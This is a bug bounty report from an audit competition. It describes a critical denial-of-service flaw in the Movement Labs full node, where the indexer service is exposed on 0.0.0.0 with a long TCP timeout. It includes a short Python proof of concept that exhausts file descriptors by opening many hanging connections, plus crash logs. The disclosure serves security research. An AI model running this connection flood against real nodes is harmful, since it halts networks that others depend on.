# #43250 \[BC-Critical] Excessive TCP timeout allows attacker to crash the sequencer via the indexer service

**Submitted on Apr 4th 2025 at 02:40:16 UTC by @usmannk for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43250
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/networks/movement/movement-full-node>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

The indexer service is served by the Movement Full Node and serves HTTP requests. However this service has an excessive 120 second timeout on its requests. This allows an attacker to crash the sequencer via resource exhaustion.

## Vulnerability Details

the indexer service is bound to the ip address 0.0.0.0 in both the default and suggested (<https://docs.movementnetwork.xyz/assets/files/config-4551e1260977506ebb8dcdea19b254ed.json>) configurations. Because 0.0.0.0 allows requests from not just the local host but any IP address on the internet, an attacker may call this RPC from outside the local network.

Each HTTP request opened to the indexer service creates a file descriptor on the host. By default nix OS allows 256 file descriptors per process. By spamming the indexer with connection requests and leaving them hanging, an attacker can use up all available file descriptors for the full node. At this point, the full node cannot accept or initiate any further connections. It will cease to receive new transactions or send any to DA.

## Impact Details

The sequencer will not be able to process transactions submit batches to DA. It will then also panic and crash, halting the network.

## References

The main RPC and sequencer node serves such an indexer: <https://github.com/movementlabsxyz/movement/tree/main/docs/indexer#prerequisites>

## Proof of Concept

## Proof of Concept

* run movement stack by calling just movement-full-node native build.setup.celestia-local.eth-local
* run the following python code pointed at the address and port of the indexer service

```
import socket
server_address = ('localhost', 30734)
arr = []
for _ in range(9999): # adjust for fd limit, likely 256 will suffice
     arr.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
     arr[-1].connect(server_address)
```

* observe as the sequencer node becomes unavailable then the sequencer crashes, halting the network.

```
2025-04-04T02:30:39.836891Z ERROR hyper::server::tcp: accept error: Too many open files (os error 24)
Error: readiness check fail - exit status 56
2025-04-04T02:30:40.336431Z  INFO movement_full_node::node::manager: Receive Terminate Signal
thread 'tokio-runtime-worker' panicked at /Users/<redacted>/.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.41.1/src/
runtime/blocking/shutdown.rs:51:21:
Cannot drop a runtime in a context where blocking is not allowed. This happens when a runtime is dropped from within an asynchronous
context.
stack backtrace:
2025-04-04T02:30:40.838283Z ERROR hyper::server::tcp: accept error: Too many open files (os error 24)
```
